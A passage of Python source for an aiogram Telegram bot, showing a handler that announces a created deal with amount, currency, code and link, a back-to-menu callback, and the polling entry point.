    cur_symbol = currency_symbols.get(currency, "RUB")

    text = get_text(
        lang,
        'deal_created',
        desc=message.text,
        amount=amount,
        currency=cur_symbol,
        code=deal_code,
        link=deal_link
    )

    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="⬅️ " + ("Меню" if lang == 'ru' else "Menu"), callback_data="back_to_menu"))

    try:
        video = FSInputFile(MAIN_VIDEO)
        await message.answer_video(video=video, caption=text, reply_markup=builder.as_markup(), parse_mode="HTML")
    except:
        await message.answer(text=text, reply_markup=builder.as_markup(), parse_mode="HTML")
    await state.clear()


@dp.callback_query(F.data == "back_to_menu")
async def back_to_menu(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()
    lang = user_language.get(callback.from_user.id, 'ru')
    text = get_text(lang, 'main_menu')
    try:
        video = FSInputFile(MAIN_VIDEO)
        media = InputMediaVideo(media=video, caption=text, parse_mode="HTML")
        await callback.message.edit_media(media=media, reply_markup=get_main_menu(lang))
    except:
        await callback.message.edit_text(text=text, reply_markup=get_main_menu(lang), parse_mode="HTML")


async def main():
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())